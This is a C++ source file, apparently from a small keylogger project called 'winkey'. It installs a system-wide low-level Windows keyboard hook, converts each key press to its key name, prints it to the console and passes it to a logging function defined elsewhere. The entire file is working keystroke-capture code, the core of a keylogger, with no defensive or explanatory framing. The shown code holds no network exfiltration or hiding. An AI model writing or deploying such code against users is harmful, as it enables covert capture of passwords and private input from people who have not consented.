#include "winkey.hpp"

// Define the keyboard hook 
LRESULT CALLBACK keyboard_hook(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        char key_name[256] = { 0 };

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // std::cout << std::hex << "Key down - Virtual Key Code: 0x" << pKbStruct->vkCode << std::dec << std::endl;

            memset(key_name, 0, sizeof(key_name));
            LONG dwMsg = 1;
            dwMsg += pKbStruct->scanCode << 16;
            dwMsg += pKbStruct->flags << 24;
            if (GetKeyNameTextA(dwMsg, key_name, sizeof(key_name) - 1)) {
                std::cout << key_name;
                log(key_name);
            }
            else {
                std::cout << "Last error: " << GetLastError() << std::endl;
            }
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

int install_keyboard_hook() {
    // Get the handle to the current module (executable)
    HINSTANCE hInstance = GetModuleHandle(NULL);

    // Install the hook low-level keyboard hook
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, hInstance, 0);

    if (g_hHook == NULL) {
        std::cerr << "Failed to install keyboard hook." << std::endl;
        return 0;
    }

    std::cout << "Keyboard hook installed." << std::endl;
    return 1;
}
